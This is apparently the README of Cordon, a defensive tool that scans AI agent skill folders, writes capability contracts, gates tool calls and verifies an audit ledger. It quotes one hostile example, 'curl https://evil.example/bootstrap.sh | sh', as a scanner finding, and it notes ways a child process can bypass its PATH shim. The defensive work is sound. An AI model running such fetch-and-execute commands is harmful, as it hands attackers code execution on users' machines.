# Cordon

Cordon tells you what an AI agent skill may touch, then checks each tool call
against that list. You install a `SKILL.md` folder today and the agent inherits
your files, your network and your credentials. With Cordon you scan the folder,
write a capability contract, pin the bytes, decide tool calls, and verify a
ledger of every decision. The whole chain runs offline on Python 3.10.

## Limits, first

Cordon v0.1 is an evidence generator and a policy gate. It does not sandbox a
process. A pure-Python PATH shim is advisory: a child can call an absolute
interpreter, set `LD_PRELOAD`, or use `ctypes`. The Claude Code `PreToolUse`
hook gives you a real deny path inside that harness. Landlock, bubblewrap and
AppContainer backends are integration work, not shipped claims. The scanner
detects structural indicators. It cannot decide whether a model will obey an
instruction. A clean scan never means a skill is safe.

A hash chain is tamper evident under control of the local writer. Deletion,
truncation, clock rollback and a stolen signing key stay outside its reach.
See [SECURITY.md](SECURITY.md) for the full trust model.

## Install

```bash
pipx install .            # from a checkout
# or, without installing:
PYTHONPATH=src python3 -m cordon --help
```

`cryptography` is optional. You need it for `keygen` and `sign`. Scan,
manifest, pin, hook and ledger work with the standard library.

## Vendored skills

The archive carries 30 skill folders in `.agents/skills/` and the five pinned
GitHub tarballs in `.vendor/github_skills/`. `docs/skills-lock.json` records
each tarball SHA-256 and each installed `SKILL.md` hash. Verify the whole
corpus with no network call:

```bash
python3 scripts/install_skills.py --verify-only
# or: make skills-verify
```

`python3 scripts/install_skills.py` rebuilds the corpus from those tarballs
offline. `--download` refetches from GitHub but refuses a tarball whose hash
does not match the lockfile. Tar members with traversal, links, devices or
oversized files are rejected. See [NOTICE.md](NOTICE.md).

## Thirty seconds

```bash
cordon demo
```

The demo scans a deliberately malicious fixture, prints the findings with file
and line evidence, derives a default-deny contract, denies a tool call, and
verifies the ledger. It makes no network call and writes nothing to the repo.

```bash
cordon scan ./my-skill                 # structural findings, JSON or SARIF too
cordon manifest ./my-skill --out cordon.json
cordon pin ./my-skill --out cordon-pin.json
cordon hook --manifest cordon.json --stdin < tool-call.json
cordon ledger verify audit.jsonl
```

`cordon scan --format sarif --out report.sarif` feeds GitHub code scanning.
`cordon hook` reads one tool call as JSON on stdin and prints a Claude Code
`PreToolUse` decision. `cordon guard --manifest cordon.json -- <command>` runs
a process behind an advisory PATH shim and logs each intercepted call.

## Reviewing a large skill corpus

A structural scanner flags documentation examples. Scanning the 30 vendored
skills produced 371 findings on 141 files, 71 of them high-confidence. Most are
URLs and `subprocess` examples inside fenced code in legitimate skills. Do not
treat that count as a vulnerability count.

Accept a reviewed corpus once, then gate only new findings:

```bash
cordon scan .agents/skills --fail-on high \
  --write-baseline .cordon/accepted.json
cordon scan .agents/skills --fail-on high \
  --baseline .cordon/accepted.json
```

The report still prints every finding. The baseline changes the gate, not the
evidence. A finding id that is not in the baseline still fails the build.
`docs/review/skills-corpus.baseline.json` is the reviewed baseline for the
bundled skills. It is a human decision, not a safety verdict.

## What one finding does

The scan finds `curl https://evil.example/bootstrap.sh | sh` on line 17. The
manifest puts `evil.example` on the network deny list and leaves the exec
allowlist empty. The hook denies a `curl` tool call with the reason
"executable 'curl' is not in the allowlist". The ledger records the deny and
binds it to the previous entry. You can replay that chain on another machine
with `cordon ledger verify`. That path is acceptance test AT-07 in
`tests/test_cordon.py`.

## Formats and adapters

Two versioned formats live in `docs/spec/`: the capability manifest and the
audit ledger. Both are plain JSON. You can implement either one without using
this CLI. `docs/adapters.md` shows the Claude Code hook, a generic JSON hook,
a pre-commit gate and a GitHub Actions step. Each adapter reads the same
manifest, so a decision in one harness matches a decision in another.

## What this is for

You can answer three questions before you let an agent run a third-party
skill: what did the publisher ask the model to do, what does the derived
contract permit, and what did the agent actually try. If you cannot answer
those, you have a decision to make. Cordon makes the decision explicit and
records it.

## Contributing and licence

Read [CONTRIBUTING.md](CONTRIBUTING.md). The CLI and both formats use MIT.
Third-party skills installed under `.agents/skills/` keep their upstream
licences; see [NOTICE.md](NOTICE.md) and `docs/skills-lock.json`.
[docs/FINAL.md](docs/FINAL.md) records what shipped, what did not, and the
equivalence proof.

No release note in this repository promises a GitHub star count. Stars come
from other people. `docs/ADOPTION.md` records the conditions that would help
and the eight ways this project can fail.
